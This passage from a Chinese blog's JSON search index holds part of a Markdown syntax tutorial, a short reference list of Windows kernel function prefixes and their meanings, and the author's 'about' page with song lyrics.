extension to be used for dest files. 输出的 HTML 看起来像这样: \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eOption\u003c/th\u003e \u003cth\u003eDescription\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003edata\u003c/td\u003e \u003ctd\u003epath to data files to supply the data that will be passed into templates.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eengine\u003c/td\u003e \u003ctd\u003eengine to be used for processing templates. Handlebars is the default.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eext\u003c/td\u003e \u003ctd\u003eextension to be used for dest files.\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e 文本右对齐或居中对齐 在任何标题下方的破折号右侧添加冒号将使该列的文本右对齐. 在任何标题下方的破折号两边添加冒号将使该列的对齐文本居中. | Option | Description | |:------:| -----------:| | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:10:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"11 链接 ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"基本链接 \u003chttps://assemble.io\u003e \u003ccontact@revolunet.com\u003e [Assemble](https://assemble.io) 呈现的输出效果如下 (将鼠标悬停在链接上，没有提示): https://assemble.io contact@revolunet.com Assemble 输出的 HTML 看起来像这样: \u003ca href=\"https://assemble.io\"\u003ehttps://assemble.io\u003c/a\u003e \u003ca href=\"mailto:contact@revolunet.com\"\u003econtact@revolunet.com\u003c/a\u003e \u003ca href=\"https://assemble.io\"\u003eAssemble\u003c/a\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:1","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"添加一个标题 [Upstage](https://github.com/upstage/ \"Visit Upstage!\") 呈现的输出效果如下 (将鼠标悬停在链接上，会有一行提示): Upstage 输出的 HTML 看起来像这样: \u003ca href=\"https://github.com/upstage/\" title=\"Visit Upstage!\"\u003eUpstage\u003c/a\u003e ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:2","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"定位标记 定位标记使你可以跳至同一页面上的指定锚点. 例如, 每个章节: ## Table of Contents * [Chapter 1](#chapter-1) * [Chapter 2](#chapter-2) * [Chapter 3](#chapter-3) 将跳转到这些部分: ## Chapter 1 \u003ca id=\"chapter-1\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 2 \u003ca id=\"chapter-2\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 3 \u003ca id=\"chapter-3\"\u003e\u003c/a\u003e Content for chapter one. 注意 定位标记的位置几乎是任意的. 因为它们并不引人注目, 所以它们通常被放在同一行了. ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:11:3","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"12 脚注 脚注使你可以添加注释和参考, 而不会使文档正文混乱. 当你创建脚注时, 会在添加脚注引用的位置出现带有链接的上标编号. 读者可以单击链接以跳至页面底部的脚注内容. 要创建脚注引用, 请在方括号中添加插入符号和标识符 ([^1]). 标识符可以是数字或单词, 但不能包含空格或制表符. 标识符仅将脚注引用与脚注本身相关联 - 在脚注输出中, 脚注按顺序编号. 在中括号内使用插入符号和数字以及用冒号和文本来添加脚注内容 ([^1]：这是一段脚注). 你不一定要在文档末尾添加脚注. 可以将它们放在除列表, 引用和表格等元素之外的任何位置. 这是一个数字脚注[^1]. 这是一个带标签的脚注[^label] [^1]: 这是一个数字脚注 [^label]: 这是一个带标签的脚注 这是一个数字脚注1. 这是一个带标签的脚注2 ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:12:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"13 图片 图片的语法与链接相似, 但包含一个在前面的感叹号. ![Minion](https://octodex.github.com/images/minion.png) 或者: ![Alt text](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\") The Stormtroopocat 像链接一样, 图片也具有脚注样式的语法: ![Alt text][id] The Dojocat 稍后在文档中提供参考内容, 用来定义 URL 的位置: [id]: https://octodex.github.com/images/dojocat.jpg \"The Dojocat\" 技巧 LoveIt 主题提供了一个包含更多功能的 图片的 shortcode. 这是一个数字脚注 ↩︎ 这是一个带标签的脚注 ↩︎ ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:13:0","tags":["Markdown"],"title":"Markdown 基本语法","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Tech"],"content":"Windows内核函数前缀可以表明函数作用，特此总结学习。","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/","tags":["Security","Widnows内核函数"],"title":"Windows内核函数前缀简述","uri":"/WindowsDev/WindowsKernel/"},{"categories":["Tech"],"content":"Windows内核函数前缀简述 Windows内核函数是Windows内核开发中必须要熟悉的函数，其每个函数命名一般都可以直接反映出其用途和作用对象，且函数名都按其所在的层次或模块加上了特定的前缀。了解了这些前缀，在看到函数名时就大致可以知道函数所属的层次和模块。特此对Windows内核函数的前缀做一个汇总，方便查找和学习Windows内核函数。 主要的Windows内核函数前缀罗列如下： Ex：Executive，提供堆管理和同步服务。 Nt：Native，对应于win32 API的内核函数。 Ke：内核层，所有多线程和多处理器的低等级同步活动都发生在内核中。 Zw：Win32子系统存在于用户模式中，所以用户模式中的应用程序可以容易地调用其例程。为了方便，Windows NT在内核模式中实现了一些有Zw前缀名的函数，这些函数可以使驱动程序调用Win32子系统例程。 Hal：硬件抽象层，Hal是Hardware Abstraction Layer的缩写。 Ob：对象管理器，集中控制Windows NT中的各种数据对象，WDM驱动程序仅需要对象管理器维护对象的参考计数，以防止对象被意外删除。 Mm：内存管理器，控制页表，页表定义了虚拟内存到物理内存之间的映射。 Ps：进程结构模块，创建并管理内核模式线程，普通的WDM驱动程序应使用一个独立的线程来循检无中断生成能力的设备。（Ps - Process） Se：安全参考监视器，使文件系统驱动程序执行安全检测。I/O请求到达WDM驱动程序前已经做完了安全检测。 Io：I/O管理，包含许多驱动程序可以使用的服务函数。 Fs：文件系统，Fs是File System的缩写。 Cc：文件缓存管理，Cc表示Cache。 Cm：系统配置管理，Cm是Configuration Manager的缩写。 Pp：“即插即用”管理，Pp表示PnP。（Plug and Play） Rtl：运行时程序库，Rtl是Runtime Library的缩写，包含工具例程，例如列表和串管理例程，内核模式驱动程序可以用这些例程来替代常规的ANSI标准例程，大部分例程可以从其名字上直接看出它的功能。 ","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/:0:0","tags":["Security","Widnows内核函数"],"title":"Windows内核函数前缀简述","uri":"/WindowsDev/WindowsKernel/"},{"categories":null,"content":"Working on ","date":"2019-08-02","objectID":"/about/:1:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"我是谁  漏洞练习生：长期处于漏洞领域的学习和练习中，什么时候出道全看天。  音乐忠实爱好者：属于没有音乐活不了的那种。  看雪二进制漏洞版块小版主：何其有幸能为教会我许多的看雪论坛贡献自己的一份力量。  羽毛球国家1亿级运动员：长期稳定占据该等级王者位置。  MOBA游戏辅助迷：爱打辅助不是因为我菜，只是不想打击祖国电竞未来的希望。  小区最强CTFer：常年霸占小区CTF竞赛排行榜第一名，从未下来过。 ","date":"2019-08-02","objectID":"/about/:2:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"And / 后续：博客后续应该会持续更新，频率不定 / 佛系：人生在世，淡然一点，所以什么都看得开 ","date":"2019-08-02","objectID":"/about/:3:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"哪里找我  WeChat订阅号：技术文章更新速度没有Blog快，但是我家仙女会更新她的内容。 有毒的猫  看雪主页:  Twitter: 基本什么都没有-。- ","date":"2019-08-02","objectID":"/about/:4:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"},{"categories":null,"content":"最后就奉上我最喜欢的歌词 I’ve been reading books of old The legends and the myths Achilles and his gold Hercules and his gifts Spider-Man’s control And Batman with his fists And clearly I don’t see myself upon that list But she said, where’d you wanna go? How much you wanna risk? I’m not lookin’ for somebody With some superhuman gifts Some superhero Some fairy-tale bliss Just something I can turn to Somebody I can kiss I want something just like this ","date":"2019-08-02","objectID":"/about/:5:0","tags":null,"title":"关于 V4ler1an","uri":"/about/"}]